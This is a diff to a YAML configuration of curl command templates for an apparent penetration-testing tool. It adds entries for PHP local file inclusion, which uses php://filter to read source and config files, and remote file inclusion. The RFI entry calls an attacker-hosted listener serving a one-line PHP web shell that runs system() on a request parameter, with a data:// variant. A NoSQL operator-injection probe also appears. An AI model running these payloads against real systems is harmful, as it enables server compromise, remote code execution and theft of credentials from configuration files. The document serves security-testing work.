@@ -203,6 +203,14 @@ usage_patterns:
     command: "curl -sS -X POST -H 'Content-Type: application/json' -d '{\"{param}\":{\"$ne\":\"x\"}}' -i -o {output} {url}"
     when: "Single-shot probe to detect whether an endpoint passes JSON values directly to a Mongo query. If the server returns HTTP 500 or a different response than for {\"{param}\":\"x\"}, the field is unsafely interpolated and operator injection is exploitable. Use after nuclei NoSQL templates flag a candidate, before committing to full auth-bypass / exfiltration runs"
 
+  - name: "LFI source disclosure via php://filter (replaces retired lfi-rfi php_filter)"
+    command: "curl -sS -o {output} '{url}?{param}=php://filter/convert.base64-encode/resource={target_file}'"
+    when: "Read PHP source (which a plain LFI would execute, not show) by base64-encoding it through php://filter. {target_file} e.g. 'index.php', 'config.php', '../config/database.php'. The response body carries a base64 blob — decode it with `base64 -d`. YOU pick which blob from the response to decode — more reliable than the retired lfi-rfi's regex that grabbed the first 20+ char base64-ish string (could be a CSRF token / session id). For non-UTF8 or filtered reads, chain convert.iconv filters."
+
+  - name: "RFI via attacker-hosted payload + callback listener (replaces retired lfi-rfi test_rfi)"
+    command: "curl -sS -o {output} '{url}?{param}=http://{listener_ip}:{listener_port}/shell.txt'"
+    when: "CORRECT RFI verification: point the include parameter at an attacker-controlled URL and confirm via a listener that ACTUALLY RECEIVED the request — NOT by inspecting the response body. Run the listener first (nc -lvnp {port}, python3 -m http.server, or tools/responder) hosting shell.txt = '<?php system($_GET[\"c\"]); ?>'. Listener logs a hit → RFI confirmed + PHP executed server-side. The retired lfi-rfi test_rfi used `status==200 and len(body)>0` which produces false positives — this listener method is the accurate technique. RFI requires allow_url_include=On (PHP). When remote-URL fetch is filtered, data:// is the LFI-side alternative: ?{param}=data://text/plain;base64,<b64-of-php>"
+
 output_formats:
   - flag: "-o {path}"
     format: "body_to_file"
